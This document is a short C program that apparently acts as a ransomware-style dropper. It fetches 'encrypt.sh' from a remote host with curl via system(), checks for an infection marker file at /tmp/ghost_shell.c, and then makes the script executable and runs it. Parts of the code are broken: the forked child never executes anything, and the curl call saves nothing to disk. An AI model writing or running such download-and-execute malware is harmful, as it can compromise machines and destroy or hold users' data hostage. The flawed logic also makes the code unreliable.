#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <errno.h>

int check_infected(const char *filename){
    struct stat buffer;
    int exist = stat(filename,&buffer);
    if(exist == 0){
        exit(1);
    }
    else{
        return 0;

    }

}

int main(void){ 
    /*Detects host OS*/
    struct utsname buffer;
    if (uname(&buffer) !=0) {
        perror("uname");
        return 1;
    }

    
    /*creates child process*/
    pid_t pid = fork();
    if (pid == 0) {
        if(chdir("tmp") == -1){
            perror("chdir");
            exit(1);
        }
        perror("exec");
        exit(1);
        }
        else if(pid > 0){
            printf("Child process completed\n");
        }
         else{
            perror("fork");
            exit(1);
        }

    char *command = malloc(60 * sizeof(char));
    strcpy(command, "cd /tmp && curl http://example.com/encrypt.sh");
    system(command);
    free(command);

    if (check_infected("/tmp/ghost_shell.c")){
        return 1;
    }

    command = malloc(100 * sizeof(char)); 
    strcpy(command, "chmod +x /tmp/encrypt.sh &&/tmp/encrypt.sh");
    system(command);
    free(command);
    
    return 0;
}
